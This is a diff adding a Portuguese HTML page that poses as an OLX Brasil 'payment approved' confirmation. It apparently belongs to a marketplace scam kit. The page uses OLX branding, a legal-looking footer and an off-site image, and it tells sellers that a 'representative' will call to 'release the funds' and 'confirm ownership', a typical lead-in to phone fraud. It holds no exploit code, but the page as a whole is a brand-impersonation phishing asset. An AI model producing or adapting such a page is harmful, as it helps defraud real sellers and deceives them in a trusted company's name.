@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="description" content="Pagamento Aprovado - OLX">
+<title>Pagamento Aprovado - OLX Brasil</title>
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+<link rel="shortcut icon" href="/images/olx-favicon.ico" type="image/x-icon">
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #f5f5f5;
+    color: #333;
+}
+
+.app-container {
+    max-width: 1200px;
+    margin: 0 auto;
+}
+
+header.header {
+    background-color: white;
+    padding: 15px 0;
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+}
+
+.header-content {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 20px;
+    display: flex;
+    align-items: center;
+}
+
+.logo img {
+    height: 40px;
+    width: auto;
+}
+
+.main-content {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 20px;
+}
+
+.breadcrumb {
+    margin-bottom: 20px;
+    color: #666;
+    font-size: 14px;
+}
+
+.breadcrumb a {
+    color: #6e0ad6;
+    text-decoration: none;
+}
+
+.breadcrumb a:hover {
+    text-decoration: underline;
+}
+
+/* CONTAINER */
+.container {
+    width: 100%;
+    max-width: 600px;
+    margin: 0 auto;
+    min-height: 60vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 20px;
+}
+
+/* FINAL */
+.final-wrapper {
+    width: 100%;
+    padding: 20px 15px;
+}
+
+.final-card {
+    background: white;
+    border: none;
+    border-radius: 12px;
+    padding: 40px 30px;
+    text-align: center;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+}
+
+.final-title {
+    color: #6e0ad6;
+    font-size: 24px;
+    font-weight: 700;
+    margin-bottom: 20px;
+}
+
+.final-img {
+    width: 140px;
+    margin-bottom: 25px;
+}
+
+.final-box {
+    background: #f3e8ff;
+    color: #2d1b4e;
+    border-radius: 14px;
+    padding: 25px;
+    font-size: 15px;
+    line-height: 1.6;
+    margin-bottom: 25px;
+}
+
+.terms {
+    font-size: 13px;
+    color: #666;
+    margin-bottom: 20px;
+}
+
+.terms span {
+    color: #6e0ad6;
+    font-weight: 600;
+}
+
+.divider {
+    width: 100%;
+    height: 1px;
+    background: #eee;
+    margin: 20px 0;
+    position: relative;
+}
+
+.attention-label {
+    position: absolute;
+    top: -10px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: white;
+    padding: 0 10px;
+    color: #6e0ad6;
+    font-size: 13px;
+    font-weight: 600;
+}
+
+.attention-text {
+    font-size: 12px;
+    color: #777;
+    margin-top: 25px;
+    line-height: 1.6;
+}
+
+/* Responsivo */
+@media (max-width: 768px) {
+    .container {
+        padding: 20px 15px;
+    }
+
+    .final-card {
+        padding: 25px 15px;
+    }
+
+    .final-title {
+        font-size: 20px;
+    }
+
+    .final-box {
+        padding: 20px;
+        font-size: 14px;
+    }
+}
+
+/* 🔥 AJUSTE AQUI: FOOTER ROXO */
+footer {
+    background-color: #6e0ad6;
+    color: #e5d9ff;
+    padding: 40px 20px 20px;
+    margin-top: 40px;
+}
+
+.footer-content {
+    max-width: 1200px;
+    margin: 0 auto;
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 30px;
+    margin-bottom: 30px;
+}
+
+.footer-column h4 {
+    color: #fff;
+    font-size: 14px;
+    font-weight: 600;
+    margin-bottom: 15px;
+    text-transform: uppercase;
+}
+
+.footer-column ul {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+}
+
+.footer-column ul li {
+    margin-bottom: 10px;
+}
+
+.footer-column a {
+    color: #e5d9ff;
+    text-decoration: none;
+    font-size: 13px;
+    transition: color 0.3s ease;
+}
+
+.footer-column a:hover {
+    color: #ffffff;
+}
+
+.social-icons {
+    display: flex;
+    gap: 15px;
+}
+
+.social-icons a {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 35px;
+    height: 35px;
+    background-color: rgba(255,255,255,0.15);
+    border-radius: 50%;
+    font-size: 16px;
+    transition: all 0.3s ease;
+    color: #fff;
+}
+
+.social-icons a:hover {
+    background-color: #ffffff;
+    color: #6e0ad6;
+}
+
+.footer-bottom {
+    border-top: 1px solid rgba(255,255,255,0.2);
+    padding-top: 20px;
+    text-align: center;
+    color: #e5d9ff;
+    font-size: 12px;
+}
+
+.footer-bottom p {
+    margin: 5px 0;
+}
+</style>
+</head>
+
+<body>
+
+<div class="app-container">
+    <header class="header">
+        <div class="header-content">
+            <div class="logo">
+                <img src="/images/olx-logo.png" alt="Logo OLX">
+            </div>
+        </div>
+    </header>
+
+    <div class="main-content">
+        <div class="breadcrumb">
+            <a href="/">OLX</a> &gt; <span>Confirmação</span>
+        </div>
+
+        <div class="container">
+            <div class="final-wrapper">
+                <div class="final-card">
+                    <h2 class="final-title">Huhuhu! Agora é com a gente!</h2>
+                    
+                    <img class="final-img" 
+                    src="https://i.ibb.co/kVKs7sbv/Gemini-Generated-Image-qsh1voqsh1voqsh1.png"
+                    onerror="this.src='https://cdn-icons-png.flaticon.com/512/4140/4140048.png'">
+
+                    <div class="final-box">
+                        Agradecemos por utilizar os nossos serviços OLX.<br><br>
+
+Informamos que um de nossos <strong>representantes entrará em contato</strong> por <strong>ligação em breve</strong>, com o objetivo de realizar a <strong>liberação dos valores</strong> e a devida <strong>confirmação de titularidade</strong>.<br><br>
+
+Solicitamos, por gentileza, que permaneça <strong>atento(a) ao telefone cadastrado</strong> para atendimento.
+                    </div>
+
+                    <p class="terms">
+                        <span>Termos de Uso</span> e a <span>Política de Privacidade</span>.
+                    </p>
+
+                    <div class="divider">
+                        <span class="attention-label">Atenção</span>
+                    </div>
+
+                    <p class="attention-text">
+                        Lembrando que essa central só é disponível para quem está realizando a sua venda com retirada por conta do comprador.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-column">
+                <h4>Conheça a OLX</h4>
+                <ul>
+                    <li><a href="#">Quem somos</a></li>
+                    <li><a href="#">Carreiras</a></li>
+                    <li><a href="#">Imprensa</a></li>
+                    <li><a href="#">Sustentabilidade</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h4>Ajuda</h4>
+                <ul>
+                    <li><a href="#">Central de ajuda</a></li>
+                    <li><a href="#">Dicas de segurança</a></li>
+                    <li><a href="#">Plano profissional</a></li>
+                    <li><a href="#">Perguntas frequentes</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h4>Legal</h4>
+                <ul>
+                    <li><a href="#">Termos de uso</a></li>
+                    <li><a href="#">Política de privacidade</a></li>
+                    <li><a href="#">Diretrizes da comunidade</a></li>
+                    <li><a href="#">Cookies</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h4>OLX nas redes</h4>
+                <div class="social-icons">
+                    <a href="#"><i class="fab fa-facebook"></i></a>
+                    <a href="#"><i class="fab fa-twitter"></i></a>
+                    <a href="#"><i class="fab fa-instagram"></i></a>
+                    <a href="#"><i class="fab fa-youtube"></i></a>
+                    <a href="#"><i class="fab fa-linkedin"></i></a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2023 OLX Brasil - Todos os direitos reservados</p>
+            <p>CNPJ: 13.673.743/0002-55 - Avenida Paulista, 1000 - São Paulo/SP</p>
+        </div>
+    </footer>
+</div>
+
+</body>
+</html>
